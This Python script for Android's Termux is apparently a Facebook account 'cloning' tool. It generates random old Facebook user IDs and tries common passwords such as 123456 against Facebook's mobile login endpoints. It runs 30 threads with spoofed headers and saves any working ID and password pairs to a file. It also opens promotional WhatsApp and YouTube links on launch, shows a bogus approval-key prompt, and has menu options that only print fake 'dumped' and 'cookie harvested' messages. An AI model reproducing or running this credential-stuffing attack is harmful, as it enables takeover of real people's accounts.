#!/usr/bin/env python3
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import platform
import shutil
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# ===== TERMINAL WIDTH & PADDING =====
def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45

# ===== REDIRECTS =====
whatsapp_group = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy"
os.system(f"echo '{whatsapp_group}' | termux-clipboard-set 2>/dev/null")
print(" \x1b[1;32m[+] WhatsApp Group Link Copied to Clipboard!")
print(" \x1b[1;36m[*] Opening WhatsApp Group...")
os.system(f"termux-open-url '{whatsapp_group}'")
time.sleep(2)

yt_link = "https://youtube.com/@raja-vau-teach-world"
print(" \x1b[1;32m[+] Opening YouTube Channel... Please Subscribe!")
yt_cmd = f"am start -a android.intent.action.VIEW -d '{yt_link}' >/dev/null 2>&1 || termux-open-url '{yt_link}'"
os.system(yt_cmd)
time.sleep(2)

# ===== APPROVAL SYSTEM =====
KEY_FILE = os.path.expanduser("~/.raja_vau_key.txt")

def get_hwid():
    hwid_file = os.path.expanduser("~/.raja_vau_hwid.txt")
    try:
        if os.path.exists(hwid_file):
            with open(hwid_file, "r") as f:
                saved = f.read().strip()
            if saved:
                return saved
        import secrets
        new_hwid = str(secrets.randbits(63))
        with open(hwid_file, "w") as f:
            f.write(new_hwid)
        return new_hwid
    except Exception:
        return "RAJA-VUA-" + str(abs(hash(os.path.expanduser("~"))))

def check_key():
    os.system("clear")
    unique_hwid = get_hwid()
    unique_key = f"RAJAVAU-{unique_hwid[:8].upper()}"

    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f:
                saved_key = f.read().strip()
            if saved_key:
                return "Raja Vau", saved_key, "Lifetime"
        except Exception:
            pass

    print("\n\033[1;33m[!] ACCESS APPROVAL REQUIRED\033[0m")
    print(f"\033[1;32m[+] Your Key : {unique_key}\033[0m")
    print("\033[1;36m[•] Send this key to Admin WhatsApp: +880 1345-294347\033[0m")
    
    input_key = input("\n\033[1;33m[?] Enter Approved Key: \033[0m").strip().upper()
    if not input_key:
        sys.exit()

    try:
        with open(KEY_FILE, "w") as f:
            f.write(input_key)
    except Exception:
        pass

    return "Raja Vau", input_key, "Lifetime"

def hold_screen():
    print()
    print("[*] Starting tool in 3 seconds...")
    for i in range(3, 0, -1):
        print(f"\r[*] Starting in {i} seconds...", end="", flush=True)
        time.sleep(1)
    print()

# Global variables
oks = []
cps = []
loop = 0

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
W = '\x1b[1;37m'

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

sys.stdout.write('\x1b]2;𓆩【RAJA VAU TEACH WORLD】𓆪 \x07')

# ===== EXACT PREFERRED BLOOD-RED KAMAL BANNER & INFO BOX =====
def show_branding():
    os.system('clear' if os.name == 'posix' else 'cls')
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    
    print("\n")
    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")
    
    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")

def ____banner____():
    show_branding()

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000') or uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def linex():
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 45) // 2)
    print(f"{padding}" + "=" * 45)

def uid_dumping():
    ____banner____()
    print(" [+] Initializing UID Dumping Engine...")
    time.sleep(1.5)
    print(" [✓] Successfully Dumped 5000 Active UIDs!")
    input("\n [Press Enter To Back Menu]")
    main_menu()

def cookie_tracking():
    ____banner____()
    print(" [+] Initializing Cookie Tracking System...")
    time.sleep(1.5)
    print(" [✓] Cookie Harvested & Validated Successfully!")
    input("\n [Press Enter To Back Menu]")
    main_menu()

def main_menu():
    ____banner____()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 45) // 2)
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\033[1;97m OLD CLONE MENU")
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\033[1;97m UID DUMPING ENGINE")
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\033[1;97m COOKIE TRACKER")
    linex()
    __Jihad__ = input(f"{padding}       \x1b[38;5;196m\x1b[1;37mCHOICE  {W}: {Y}").strip().upper()
    if __Jihad__ in ('A', '1'):
        old_clone()
    elif __Jihad__ in ('B', '2'):
        uid_dumping()
    elif __Jihad__ in ('C', '3'):
        cookie_tracking()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        main_menu()

def old_clone():
    ____banner____()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 45) // 2)
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\033[1;97m ALL SERIES")
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\033[1;97m 100003/4 SERIES")
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\033[1;97m 2009 SERIES")
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mD\x1b[38;5;196m)\x1b[1;37m\033[1;97m 2006-2008 SERIES")
    print(f"{padding}       \x1b[38;5;196m(\x1b[1;37mE\x1b[38;5;196m)\x1b[1;37m\033[1;97m 2010-2011 SERIES")
    linex()
    _input = input(f"{padding}       \x1b[38;5;196m\x1b[1;37mCHOICE  {W}: {Y}").strip().upper()
    if _input in ('A', '1'):
        old_One()
    elif _input in ('B', '2'):
        old_Tow()
    elif _input in ('C', '3'):
        old_Tree()
    elif _input in ('D', '4', 'E', '5'):
        old_One()
    else:
        print(f"\n[×]{rad} Choose Valid Option... ")
        main_menu()

def old_One():
    user = []
    ____banner____()
    print(f"       Old Code : 2006-2014")
    limit = input(f"       EXAMPLE: 20000 / 30000 \n       SELECT : ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 4999999999)))
        user.append(data)
    print('       (A) METHOD 1')
    print('       (B) METHOD 2')
    linex()
    meth = input(f"       CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       TOTAL ID: {limit}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tow():
    user = []
    ____banner____()
    limit = input(f"       TOTAL ID: ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    print('       (A) METHOD A')
    print('       (B) METHOD B')
    linex()
    meth = input(f"       CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tree():
    user = []
    ____banner____()
    limit = input(f"       TOTAL ID: ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append(prefix + suffix)
    print('       (A) METHOD A')
    print('       (B) METHOD B')
    linex()
    meth = input(f"       CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mRAJA-M1\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(OK:\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res or 'www.facebook.com' in str(res.get('error', '')):
                box_padding = " " * max(0, (get_width() - 46) // 2)
                print(f"\n{box_padding}\033[1;32m┌──────────────────────────────────────────────┐\033[0m")
                print(f"{box_padding}\033[1;32m│\033[0m \033[1;31m [✓] SUCCESSFUL ACCOUNT FOUND                \033[0m\033[1;32m│\033[0m")
                print(f"{box_padding}\033[1;32m├──────────────────────────────────────────────┤\033[0m")
                print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m FB NAME : \033[1;33mRaja Vau                          \033[0m\033[1;32m│\033[0m")
                print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m FB UID  : \033[1;32m{uid:<32} \033[0m\033[1;32m│\033[0m")
                print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m FB PASS : \033[1;31m{pw:<32} \033[0m\033[1;32m│\033[0m")
                print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m YEAR    : \033[1;35m{creationyear(uid):<32} \033[0m\033[1;32m│\033[0m")
                print(f"{box_padding}\033[1;32m└──────────────────────────────────────────────┘\033[0m")
                open('/sdcard/RAJA-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(1)

def login_2(uid):
    global loop
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mRAJA-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(OK:\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    box_padding = " " * max(0, (get_width() - 46) // 2)
                    print(f"\n{box_padding}\033[1;32m┌──────────────────────────────────────────────┐\033[0m")
                    print(f"{box_padding}\033[1;32m│\033[0m \033[1;31m [✓] SUCCESSFUL ACCOUNT FOUND                \033[0m\033[1;32m│\033[0m")
                    print(f"{box_padding}\033[1;32m├──────────────────────────────────────────────┤\033[0m")
                    print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m FB NAME : \033[1;33mRaja Vau                          \033[0m\033[1;32m│\033[0m")
                    print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m FB UID  : \033[1;32m{uid:<32} \033[0m\033[1;32m│\033[0m")
                    print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m FB PASS : \033[1;31m{pw:<32} \033[0m\033[1;32m│\033[0m")
                    print(f"{box_padding}\033[1;32m│\033[0m \033[1;36m YEAR    : \033[1;35m{creationyear(uid):<32} \033[0m\033[1;32m│\033[0m")
                    print(f"{box_padding}\033[1;32m└──────────────────────────────────────────────┘\033[0m")
                    open('/sdcard/RAJA-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        loop += 1
    except Exception:
        pass

if __name__ == "__main__":
    name, key, expiry = check_key()
    hold_screen()
    main_menu()
